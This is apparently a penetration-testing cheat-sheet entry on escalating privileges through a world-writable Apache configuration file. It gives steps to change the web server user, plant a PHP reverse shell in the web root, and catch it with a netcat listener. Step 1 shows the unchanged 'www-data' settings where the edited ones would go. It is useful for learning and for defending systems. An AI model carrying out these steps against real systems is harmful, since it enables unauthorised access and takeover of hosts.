# Apache Conf Privilege Escalation

### Investigation <a href="#investigation" id="investigation"></a>

```shellscript
ls -al /etc/apache2

-rwxrwxrwx  1 root root  7094 NOV 7  2023 apache2.conf
```

If we can modify the apache configuration file, we can update the web owner (www-data) to arbitrary user.

### Exploitation <a href="#exploitation" id="exploitation"></a>

#### 1. Update Apache.Conf <a href="#id-1-update-apacheconf" id="id-1-update-apacheconf"></a>

First modify “apache.conf” file to change the web user with new one.

```shellscript
# These need to be set in /etc/apache2/envvars
User www-data
Group www-data
```

#### 2. Insert Reverse Shell Script <a href="#id-2-insert-reverse-shell-script" id="id-2-insert-reverse-shell-script"></a>

In the web directory (e.g. `/var/www/html`), create the script to reverse shell.\
Assume the website uses PHP, so we can create “shell.php” in the web root and insert [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) script.

#### 3. Restart Apache Server <a href="#id-3-restart-apache-server" id="id-3-restart-apache-server"></a>

#### 4. Get a Shell <a href="#id-4-get-a-shell" id="id-4-get-a-shell"></a>

We need to start a listener in local terminal.

```shellscript
nc -lvnp 1234
```

Then access to the web page e.g. `https://example.com/shell.php`.

We should get a shell as the desired user.
